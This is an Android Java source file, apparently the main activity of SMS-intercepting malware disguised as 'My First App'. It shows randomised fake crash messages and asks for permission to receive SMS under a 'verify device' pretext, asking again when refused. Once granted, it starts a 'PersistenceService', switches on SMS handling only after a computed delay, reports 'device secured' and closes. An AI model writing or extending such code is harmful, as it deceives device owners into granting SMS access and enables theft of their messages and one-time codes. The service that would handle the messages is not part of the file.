package com.dev.test.myfirstapp.ui;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.dev.test.myfirstapp.R;
import com.dev.test.myfirstapp.services.PersistenceService;
import com.dev.test.myfirstapp.utils.DelayManager;
import java.util.Random;

public class MainActivity extends Activity {
    private static final int SMS_PERMISSION_CODE = 1001;
    private SharedPreferences prefs;
    private TextView statusText;
    private Button actionButton;
    private Handler handler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
        handler = new Handler();
        statusText = findViewById(R.id.status_text);
        actionButton = findViewById(R.id.action_button);

        handler.postDelayed(this::showFakeError, 2000);
        requestSmsPermission();
    }

    private void requestSmsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
                statusText.setText(R.string.permission_rationale);
                actionButton.setText(R.string.verify_device);
                actionButton.setVisibility(View.VISIBLE);
                actionButton.setOnClickListener(v -> {
                    ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.RECEIVE_SMS},
                        SMS_PERMISSION_CODE);
                });
            } else {
                startDelayedActivation();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, R.string.device_verified, Toast.LENGTH_SHORT).show();
                startDelayedActivation();
            } else {
                showFakeError();
                DelayManager.schedulePermissionRetry(this);
            }
        }
    }

    private void startDelayedActivation() {
        Intent serviceIntent = new Intent(this, PersistenceService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        long activationDelay = DelayManager.calculateActivationDelay();
        prefs.edit().putLong("activation_time", System.currentTimeMillis() + activationDelay).apply();

        handler.postDelayed(() -> {
            Intent delayedIntent = new Intent(this, PersistenceService.class);
            delayedIntent.putExtra("activate_sms", true);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(delayedIntent);
            } else {
                startService(delayedIntent);
            }
        }, activationDelay);

        statusText.setText(R.string.device_secured);
        handler.postDelayed(this::finish, 1000);
    }

    private void showFakeError() {
        String[] errorMessages = {
            "Unfortunately, My First App has stopped.",
            "Application Error: Connection timed out.",
            "App initialization failed. Please try again later.",
            "Unexpected error occurred. Code: 0x8004DE40"
        };
        String randomError = errorMessages[new Random().nextInt(errorMessages.length)];
        statusText.setText(randomError);
        actionButton.setVisibility(View.GONE);
        handler.postDelayed(this::finish, 3000);
    }
}